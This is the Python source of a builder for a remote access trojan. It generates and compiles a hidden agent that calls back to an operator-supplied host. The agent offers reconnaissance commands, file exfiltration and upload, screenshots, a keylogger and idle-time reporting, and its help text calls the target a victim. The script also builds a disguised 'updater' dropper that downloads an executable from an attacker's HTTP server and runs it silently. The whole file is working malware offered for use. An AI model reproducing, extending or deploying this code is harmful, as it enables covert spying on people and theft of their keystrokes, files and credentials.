import subprocess
import sys
import os
import platform
import shutil

required_packages = ["pynput", "pyautogui"]
for package in required_packages:
	try:
		__import__(package)
	except ImportError:
		print(f"[-] Missing dependency '{package}'. Installing...")
		subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def generate_payload(lhost, lport, target_os, payload_name):
    payload_code = f"""
import socket
import os
import subprocess
import platform
import threading
import time
import pyautogui
import io
import ctypes
from pynput.keyboard import Listener, Key

os.environ["PYTHONIOENCODING"] = "utf-8"

host = '{lhost}'
port = {lport}

keyboard_buffer = []
listener_instance = None

def detect_os():
    return platform.system()

def get_system_encoding():
    if detect_os() == "Windows":

        return 'cp1255'
    return 'utf-8'

def run_cmd_encoded(cmd_string):
    try:
        if detect_os() == "Windows":

            raw_output = subprocess.check_output(cmd_string, shell=True, stderr=subprocess.STDOUT)
            try:
                return raw_output.decode('cp1255')
            except UnicodeDecodeError:
                return raw_output.decode('cp862', errors='ignore')
        else:
            raw_output = subprocess.check_output(cmd_string, shell=True, stderr=subprocess.STDOUT)
            return raw_output.decode('utf-8', errors='ignore')
    except Exception as e:
        return str(e)

def get_hostname(conn):
    output = run_cmd_encoded('hostname').strip()
    conn.sendall(output.encode('utf-8', errors='ignore') + b"---EOF---\\n")

def get_user(conn):
    output = run_cmd_encoded('whoami').strip()
    conn.sendall(output.encode('utf-8', errors='ignore') + b"---EOF---\\n")

def current_working_directory(conn):
    current_directory = os.getcwd()
    conn.sendall(current_directory.encode('utf-8', errors='ignore') + b"---EOF---\\n")

def sysinfo(conn):
    target_os = detect_os()
    if target_os == "Windows":
        output = run_cmd_encoded('systeminfo')
    else:
        output = run_cmd_encoded('hostnamectl')
    conn.sendall(output.encode('utf-8', errors='ignore') + b"---EOF---\\n")
        
def check_netstat(conn):
    target_os = detect_os()
    if target_os == "Windows":
        output = run_cmd_encoded('netstat -an')
    else:
        output = run_cmd_encoded('netstat -antp')
    conn.sendall(output.encode('utf-8', errors='ignore') + b"---EOF---\\n")

def directory_listing(conn):
    target_os = detect_os()
    if target_os == "Windows":
        output = run_cmd_encoded('dir')
    else:
        output = run_cmd_encoded('ls -la')
    conn.sendall(output.encode('utf-8', errors='ignore') + b"---EOF---\\n")

def change_directory(conn, path):
    try:
        if not path:
            conn.sendall(b"Path not provided---EOF---\\n")
            return
        os.chdir(path)
        current_directory = os.getcwd()
        conn.sendall(f"Changed directory to: {{current_directory}}---EOF---\\n".encode('utf-8', errors='ignore'))
    except Exception as e:
        conn.sendall(f"Failed to change directory: {{str(e)}}---EOF---".encode('utf-8', errors='ignore'))

def check_processes(conn):
    target_os = detect_os()
    if target_os == "Windows":
        output = run_cmd_encoded('tasklist')
    else:
        output = run_cmd_encoded('ps aux')
    conn.sendall(output.encode('utf-8', errors='ignore') + b"---EOF---\\n")

def download_file(conn, filepath):
    try:
        if not filepath or not os.path.exists(filepath):
            conn.sendall(b"[-] Error: File not found---EOF---\\n")
            return
        
        file_size = os.path.getsize(filepath)
        conn.sendall(f"SIZE:{{file_size}}\\n".encode('utf-8'))
        
        with open(filepath, "rb") as f:
            while True:
                chunk = f.read(1024)
                if not chunk:
                    break
                conn.sendall(chunk)
        time.sleep(0.1)
        conn.sendall(b"---EOF---")
    except Exception as e:
        conn.sendall(f"[-] Error during download: {{str(e)}}---EOF---\\n".encode('utf-8', errors='ignore'))

def upload_file(conn, filepath):
    try:
        if not filepath:
            conn.sendall(b"[-] Error: Target path not provided---EOF---\\n")
            return
        
        conn.sendall(b"READY_FOR_UPLOAD---EOF---\\n")
        
        with open(filepath, "wb") as f:
            while True:
                chunk = conn.recv(1024)
                if not chunk:
                    break
                if b"---EOF---" in chunk:
                    f.write(chunk.replace(b"---EOF---", b""))
                    break
                f.write(chunk)
        conn.sendall(b"[+] File uploaded successfully---EOF---\\n")
    except Exception as e:
        conn.sendall(f"[-] Error during upload: {{str(e)}}---EOF---\\n".encode('utf-8', errors='ignore'))

def help_menu(conn):
    conn.sendall(b"Available commands:\\nwhoami - Display the current user\\nhostname - Display the current computer's name\\npwd - Display current working directory\\nls - Display directory's contents\\nsysinfo - View system information\\ncd - Navigate between directories\\nps - Display current running processes\\nnetstat - Display network statstics\\nidletime - Display victim's idle time\\ndownload <file> - Exfiltrate file from victim\\nupload <file> - Send file to victim\\nscreenshot - Capture a screenshare from the victim\\nkeylog_start - Start keylogger\\nkeylog_stop - Stop keylogger\\nkeylog_dump - Retrieve captured keys\\nmodules - List background modules\\nstatus - Show modules status---EOF---\\n")
    
modules_status = {{
    "heartbeat": {{"status": "STOPPED", "thread": None, "event": None}},
    "system_monitor": {{"status": "STOPPED", "thread": None, "event": None}},
    "keyboard": {{"status": "STOPPED", "thread": None, "event": None}}
}}

def run_heartbeat(conn, stop_event):
    while not stop_event.is_set():
        try:
            conn.sendall(b"[+] HEARTBEAT: Agent is alive\\n")
        except:
            break
        for _ in range(10):
            if stop_event.is_set():
                break
            time.sleep(1)

def run_system_monitor(conn, stop_event):
    while not stop_event.is_set():
        try:
            target_os = detect_os()
            if target_os == "Windows":
                output = run_cmd_encoded('tasklist')
                count = len(output.splitlines())
                msg = f"[+] SYSTEM_MONITOR: Windows processes count: {{count}}\\n"
            else:
                output = run_cmd_encoded('ps aux')
                count = len(output.splitlines())
                msg = f"[+] SYSTEM_MONITOR: Linux processes count: {{count}}\\n"
            conn.sendall(msg.encode('utf-8', errors='ignore'))
        except:
            break
        for _ in range(30):
            if stop_event.is_set():
                break
            time.sleep(1)

def on_press(key):
    global keyboard_buffer
    try:
        keyboard_buffer.append(key.char)
    except AttributeError:
        if key == Key.space:
            keyboard_buffer.append(' ')
        elif key == Key.enter:
            keyboard_buffer.append('\\n')
        elif key == Key.tab:
            keyboard_buffer.append('\\t')

def run_keyboard(stop_event):
    global listener_instance
    with Listener(on_press=on_press) as listener:
        listener_instance = listener
        while not stop_event.is_set():
            time.sleep(0.5)
        listener.stop()

def keyboard_dump(conn):
    global keyboard_buffer
    if not keyboard_buffer:
        conn.sendall(b"No keyboard events in memory---EOF---\\n")
        return
    resp = "".join(keyboard_buffer) + "\\n"
    keyboard_buffer.clear()
    conn.sendall((resp + "---EOF---").encode('utf-8', errors='ignore'))
    
def take_screenshot(conn):
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        image_bytes = img_byte_arr.getvalue()
        
        header = ("SIZE:" + str(len(image_bytes)) + "\\n").encode('utf-8')
        conn.sendall(header + image_bytes + b"---EOF---")
    except Exception as e:
        error_msg = ("[-] Error capturing screenshot: " + str(e)).encode('utf-8', errors='ignore')
        conn.sendall(error_msg + b"---EOF---")
        
def get_idle_time_windows():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]
        
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        is_tick = ctypes.windll.kernel32.GetTickCount()
        idle_ms = is_tick - lii.dwTime
        return int(idle_ms / 1000)
    return 0
    
def get_idle_time_linux():
    try:
        tty_path = os.ttyname(0)
        last_activity = os.stat(tty_path).st_atime
        idle_seconds = int(time.time() - last_activity)
        return idle_seconds
    except Exception:
        return 0
        
def get_idle_time():
    os_name = platform.system().lower()
    if "windows" in os_name:
        return get_idle_time_windows()
    elif "linux" in os_name:
        return get_idle_time_linux()

commands = {{
    "hostname": get_hostname,
    "whoami": get_user,
    "pwd": current_working_directory,
    "sysinfo": sysinfo,
    "ls": directory_listing,
    "cd": change_directory,
    "ps": check_processes,
    "help": help_menu,
    "keylog_dump": keyboard_dump,
    "netstat": check_netstat,
    "screenshot": take_screenshot
}}

def handle_controller(conn):
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            full_command = data.decode('utf-8', errors='ignore').strip()
            parts = full_command.split(' ', 1)
            command = parts[0]
            arg = parts[1] if len(parts) > 1 else ""
            if command == "cd":
                change_directory(conn, arg)
            elif command == "idletime":
                seconds = get_idle_time()
                response = f"[+] Idle time: {{seconds}} seconds ---EOF---\\n"
                conn.sendall(response.encode('utf-8'))
                continue
            elif command == "download":
                download_file(conn, arg)
            elif command == "upload":
                upload_file(conn, arg)
            elif command == "modules":
                conn.sendall(b"Available modules:\\nheartbeat\\nsystem_monitor\\nkeyboard\\n---EOF---")
            elif command == "status":
                resp = "MODULE               STATUS\\n"
                for m, d_info in modules_status.items():
                    resp += f"{{m:<16}} {{d_info['status']}}\\n"
                conn.sendall((resp + "---EOF---\\n").encode('utf-8'))
            elif command == "keylog_start":
                if modules_status["keyboard"]["status"] == "RUNNING":
                    conn.sendall(b"Keylogger is already running---EOF---\\n")
                else:
                    stop_event = threading.Event()
                    modules_status["keyboard"]["event"] = stop_event
                    t = threading.Thread(target=run_keyboard, args=(stop_event,), daemon=True)
                    modules_status["keyboard"]["thread"] = t
                    modules_status["keyboard"]["status"] = "RUNNING"
                    t.start()
                    conn.sendall(b"[+] Keylogger started---EOF---\\n")
            elif command == "keylog_stop":
                if modules_status["keyboard"]["status"] == "STOPPED":
                    conn.sendall(b"Keylogger is not running---EOF---\\n")
                else:
                    modules_status["keyboard"]["event"].set()
                    modules_status["keyboard"]["status"] = "STOPPED"
                    conn.sendall(b"[+] Keylogger stopped---EOF---\\n")
            elif command == "start":
                if arg not in modules_status:
                    conn.sendall(b"Module not found---EOF---\\n")
                elif modules_status[arg]["status"] == "RUNNING":
                    conn.sendall(f"Module {{arg}} is already running---EOF---\\n".encode('utf-8'))
                else:
                    stop_event = threading.Event()
                    modules_status[arg]["event"] = stop_event
                    if arg == "heartbeat":
                        t = threading.Thread(target=run_heartbeat, args=(conn, stop_event), daemon=True)
                    elif arg == "system_monitor":
                        t = threading.Thread(target=run_system_monitor, args=(conn, stop_event), daemon=True)
                    elif arg == "keyboard":
                        t = threading.Thread(target=run_keyboard, args=(stop_event,), daemon=True)
                    else:
                        conn.sendall(b"Unknown module---EOF---")
                        continue
                        
                    modules_status[arg]["thread"] = t
                    modules_status[arg]["status"] = "RUNNING"
                    t.start()
                    conn.sendall(f"[+] {{arg}} started---EOF---\\n".encode('utf-8'))
            elif command == "stop":
                if arg not in modules_status or modules_status[arg]["status"] == "STOPPED":
                    conn.sendall(f"Module {{arg}} is not running---EOF---\\n".encode('utf-8'))
                else:
                    modules_status[arg]["event"].set()
                    modules_status[arg]["status"] = "STOPPED"
                    conn.sendall(f"[+] {{arg}} stopped---EOF---\\n".encode('utf-8'))
            elif command in commands:
                commands[command](conn)
            else:
                conn.sendall(b"Unknown command ---EOF---")
    except:
        pass

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                handle_controller(s)
        except:
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()
"""

    temp_filename = "temp_payload.py"
    with open(temp_filename, "w", encoding='utf-8') as f:
        f.write(payload_code)

    print(f"[+] Compiling payload for {target_os}...\n")
    cmd = ["pyinstaller", "--onefile", "--noconsole", "--name", payload_name, temp_filename]
    
    result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if result.returncode == 0:
        print(f"\n[+] Compilation finished successfully. Check the 'dist' folder.")
    else:
        print(f"\n[-] Compilation failed with exit code {result.returncode}.")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(f"Usage: python {sys.argv[0]} <LHOST> <LPORT> <windows/linux> <payload_name>")
        sys.exit(1)
    current_os = platform.system()
    target_os = sys.argv[3].capitalize()
    payload_name = sys.argv[4]
    os_mapping = {
        "Windows": "Windows",
        "Linux": "Linux"
    }
    if target_os not in os_mapping:
        print(f"[-] Error: Unknown target OS '{sys.argv[3]}'. Use Windows or Linux.")
        sys.exit(1)
    if current_os != os_mapping[target_os]:
        print(f"[-] Compilation Error: You are running on [{current_os}], but trying to build for [{target_os}].")
        print("[-] Pyinstaller does not support native cross-platform compilation.")
        print(f"[-] Please run this builder script directly inside a {target_os} environment.")
        sys.exit(1)
    print(f"[+] Environment verified: Compiling on {current_os} for {target_os}...")
    generate_payload(sys.argv[1], int(sys.argv[2]), target_os, payload_name)

def create_and_compile_dropper(server_ip, http_port):
    dropper_template = """
import platform
import subprocess
import urllib.request
import os
import tempfile
import sys
import re

SERVER_IP = "{server_ip}"
PORT = {http_port}
SERVER_URL = f"http://{{SERVER_IP}}:{{PORT}}"

def get_payload_from_server(server_url, current_os):
    try:
        with urllib.request.urlopen(server_url) as response:
            html_content = response.read().decode('utf-8')
        
        files = re.findall(r'href="([^"]+)"', html_content)
        target_file = None
        
        if "windows" in current_os.lower():
            for f in files:
                if f.lower().endswith('.exe'):
                    target_file = f
                    break
        else:
            for f in files:
                if not f.lower().endswith(('.exe', '.py')) and f not in ['.', '..', '']:
                    target_file = f
                    break
        return target_file
    except Exception:
        return None
        
def main():
    current_os = platform.system().lower()
    file_name = get_payload_from_server(SERVER_URL, current_os)
    if not file_name:
        return
        
    temp_dir = tempfile.gettempdir()
    save_path = os.path.join(temp_dir, file_name)
        
    try:
        download_url = f"{{SERVER_URL}}/{{file_name}}"
        urllib.request.urlretrieve(download_url, save_path)
        
        if "windows" in current_os:
            subprocess.Popen([save_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
        else:
            os.chmod(save_path, 0o755)
            subprocess.Popen([save_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    except Exception:
        pass
        
if __name__ == "__main__":
    main()
"""
    script_name = "dropper_temp.py"
    filled_code = dropper_template.format(server_ip=server_ip, http_port=http_port)
    with open(script_name, "w", encoding="utf-8") as f:
        f.write(filled_code)
    
    print(f"[+] Dropper script generated successfully.\n")
    print(f"[+] Compiling dropper for {target_os}...\n")

    try:
        subprocess.run(["pyinstaller", "--noconsole", "--onefile", "--name", "updater", script_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        print("[+] Compilation finished successfully!")
        
        for cleanup_item in [script_name, "updater.spec"]:
            if os.path.exists(cleanup_item):
                if os.path.isdir(cleanup_item):
                        shutil.rmtree(cleanup_item)
                else:
                    os.remove(cleanup_item)
                    
    except Exception as e:
        print(f"[-] Compilation failed (Make sure pyinstaller is installed): {e}")
HTTP_PORT = 8000
create_and_compile_dropper(sys.argv[1], HTTP_PORT)
